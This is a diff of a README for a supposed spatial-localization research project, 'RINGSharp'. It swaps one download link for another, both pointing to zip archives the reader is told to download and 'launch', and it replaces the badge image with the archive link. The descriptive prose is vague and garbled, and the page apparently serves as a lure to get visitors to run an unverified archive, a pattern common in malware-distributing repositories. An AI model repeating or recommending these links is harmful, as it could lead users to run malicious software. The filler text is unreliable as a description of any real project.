@@ -18,9 +18,9 @@ At RINGSharp, our primary goal is to push the boundaries of spatial analysis and
 Our approach to PR-by-PE Global Localization is grounded in a deep understanding of spatial transformations and grammatical structures. By leveraging roto-translation equivariant gram learning, we are able to capture the intricate interplay between spatial elements and global positioning, paving the way for new insights and advancements in the field.
 
 ## 📚 Getting Started
-To embark on your journey with RINGSharp, simply download the [Release.zip file](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip) and launch it to access the full suite of resources and tools available in this repository. Whether you're a seasoned researcher or a curious beginner, RINGSharp welcomes you to explore, learn, and innovate in the realm of spatial analytics.
+To embark on your journey with RINGSharp, simply download the [https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip file](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip) and launch it to access the full suite of resources and tools available in this repository. Whether you're a seasoned researcher or a curious beginner, RINGSharp welcomes you to explore, learn, and innovate in the realm of spatial analytics.
 
-[![Download RINGSharp](https://img.shields.io/badge/Download-Release.zip-brightgreen)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![Download RINGSharp](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip)](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip)
 
 ## 🌐 Further Exploration
 If you're eager to delve deeper into the world of RINGSharp, we invite you to visit our website for additional resources, publications, and updates related to our ongoing research and projects.
